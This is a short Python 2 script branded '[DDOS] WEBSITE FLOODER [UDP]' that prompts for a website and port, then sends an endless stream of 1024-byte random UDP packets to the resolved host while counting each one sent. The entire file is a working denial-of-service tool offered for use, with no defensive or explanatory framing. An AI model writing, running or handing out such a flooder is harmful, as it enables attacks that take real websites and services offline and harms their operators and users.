import socket, random, sys
print "\n\t\t#################################################"
print "\t\t#                                               #"
print "\t\t#          [DDOS] WEBSITE FLOODER [UDP]         #"
print "\t\t#                  BY WARLOCK                   #"
print "\t\t#                                               #"
print "\t\t#################################################"
def udpflood(target,port):
	psize = 1024
	sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	bytes = random._urandom(psize)
	sock.sendto(bytes,(target, port))
try:
        u=raw_input("\n[+]PLEASE ENTER URL OR WEBSITE : ")
        p = raw_input("\n[+]ENTER PORT : ")
        n=0
        while True:
                target = socket.gethostbyname(u) 
                udpflood(target,int(p))
                n=n+1
                print "\t[+]REQUEST SENT : ",n
except:
        print"\n\t\t[-]DONE !!!"

raw_input("[+]PRESS ANY KEY TO EXIT")
